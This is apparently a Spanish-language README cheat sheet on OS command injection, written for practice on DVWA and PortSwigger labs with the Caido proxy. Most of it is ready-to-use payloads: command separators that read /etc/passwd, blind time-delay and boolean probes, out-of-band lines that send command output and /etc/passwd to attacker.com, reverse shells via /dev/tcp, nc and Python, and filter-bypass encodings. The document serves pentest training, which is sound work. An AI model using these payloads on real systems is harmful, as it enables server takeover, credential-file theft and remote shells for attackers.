<div align="center">

# 💻 Command Injection
### Inyección de Comandos del Sistema Operativo

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Command%20Injection-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **Command Injection:** input del usuario pasa sin sanitizar a funciones de ejecución del sistema (`system()`, `exec()`, `popen()`, `subprocess.call(shell=True)`, `child_process.exec`). El shell no distingue entre el comando original y el inyectado, ejecutando ambos. El resultado es ejecución de comandos OS arbitrarios en el contexto del web server. **Blind:** sin output directo — confirmar via delay, DNS callback o HTTP out-of-band.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Entradas Típicas](#-entradas-típicas) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🧱 Payloads Avanzados](#-payloads-avanzados) |
| 06 | [🛡️ Bypass de Filtros](#️-bypass-de-filtros) |
| 07 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 08 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 09 | [🧠 Señales](#-señales) |
| 10 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 11 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | Command Injection |
| **PortSwigger** | OS command injection |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-interactsh-a855f7?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `Replay` — modificar parámetros de input |
| **interactsh-client** | OAST — callbacks OOB para blind injection |
| **curl** | Reproducción rápida fuera de proxy |

---

## 🔍 Entradas Típicas

![Context](https://img.shields.io/badge/Detección-Parámetros-ff6b00?style=flat-square)

Parámetros que sugieren operación del sistema:

- `ip=`, `host=`, `domain=`
- `ping=`, `nslookup=`
- `filename=`, `cmd=`

Funcionalidades de mayor riesgo:

- ping / traceroute / nslookup en UI
- conversión de archivos (ffmpeg, ImageMagick)
- generación de PDFs con herramientas CLI
- envío de email server-side

> [!TIP]
> Funcionalidades de diagnóstico de red (ping, nslookup) son los candidatos más comunes para command injection directa.

---

## 🧪 Payloads Base

### `[01]` Separadores Linux

```text
127.0.0.1;id
127.0.0.1&&id
127.0.0.1||id
127.0.0.1|id
127.0.0.1`id`
127.0.0.1$(id)
;id;whoami;uname -a
;cat /etc/passwd
```

### `[02]` Separadores Windows

```text
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
```

### `[03]` Blind — time delay

```text
127.0.0.1;sleep 10
127.0.0.1 && sleep 10
127.0.0.1 | sleep 10
; ping -c 10 127.0.0.1
```

---

## 🧱 Payloads Avanzados

![Context](https://img.shields.io/badge/Técnica-Avanzada-a855f7?style=flat-square)

### `[01]` Blind — Out-of-Band DNS

```bash
127.0.0.1; nslookup `whoami`.attacker.com
127.0.0.1; curl http://$(whoami).attacker.com/
127.0.0.1; dig `id`.attacker.com
```

### `[02]` Blind — Out-of-Band HTTP

```bash
127.0.0.1; curl http://attacker.com/?c=$(whoami)
127.0.0.1; wget -q http://attacker.com/$(cat /etc/passwd | base64)
127.0.0.1; curl -d @/etc/passwd http://attacker.com/
```

### `[03]` Condicional — Boolean blind

```bash
; if [ $(whoami) = "root" ]; then sleep 5; fi
; if [ $(whoami|cut -c 1) == "r" ]; then sleep 5; fi
```

### `[04]` Reverse shells

```bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
; nc -e /bin/sh attacker.com 4444
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 🛡️ Bypass de Filtros

![Context](https://img.shields.io/badge/Bypass-Filtros%20de%20Shell-ff3c6e?style=flat-square)

### Sin espacios permitidos

```bash
cat${IFS}/etc/passwd          # Internal Field Separator
cat</etc/passwd               # input redirection
{cat,/etc/passwd}             # brace expansion
cat%09/etc/passwd             # tab (%09)
```

### Palabras clave bloqueadas

```bash
w'h'o'am'i                   # quote insertion
w"h"o"am"i
wh\oami                      # backslash
who$()ami                    # empty command substitution
wh$(echo "")oami
```

### Encoded characters

```bash
echo -e "\x77\x68\x6f\x61\x6d\x69"      # hex: whoami
$(printf '\x77\x68\x6f\x61\x6d\x69')
```

### Wildcards

```bash
/bin/ca?  /etc/passwd
/bin/c*t /etc/passwd
cat /et?/p?sswd
cat /etc/p*ss*
```

### Variable expansion

```bash
${HOME:0:1}etc${HOME:0:1}passwd    # produce /etc/passwd
```

### Newline bypass

```text
%0a id %0a
%0aid
```

### Case bypass (Windows)

```text
wHoAmI
CMD.exe /c wHoAmI
```

> [!IMPORTANT]
> Probar separadores Linux primero, luego Windows. La shell del servidor determina qué separadores funcionan.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request funcional

Localizar acción que ejecuta comando server-side.

### `[02]` Replay con separador

```text
127.0.0.1;id
```

### `[03]` Evaluar respuesta

- output de `uid=` / `whoami` → injection directa
- retraso reproducible → blind injection
- error de shell inesperado → vector, ajustar separador

### `[04]` Escalar si blind

1. Probar delay: `127.0.0.1;sleep 5`
2. Si confirma → probar OAST: `127.0.0.1;nslookup <token>.oastify.com`

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

```bash
curl -i "http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit#"
curl -i "http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit#"
```

---

## 🧠 Señales

| Señal | Lectura |
|-------|---------|
| Output de `uid=` / `whoami` | command injection directa confirmada |
| Retraso reproducible exacto | blind command injection |
| Callback DNS/HTTP en interactsh | OOB — injection ciega confirmada |
| Error de shell inusual | separador incorrecto, probar variante |
| Response parcial del comando original | separador funciona, output incluido |

---

## 🧭 Ruta de Práctica

1. DVWA Command Injection
2. PortSwigger: useful commands (output directo)
3. PortSwigger: blind via time delay
4. PortSwigger: blind via OAST

---

## 📝 Checklist

- [ ] separador válido detectado
- [ ] shell target inferida (Linux / Windows)
- [ ] output directo o señal lateral confirmada
- [ ] payload mínimo reproducible documentado

---

## 🔗 Referencias

- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
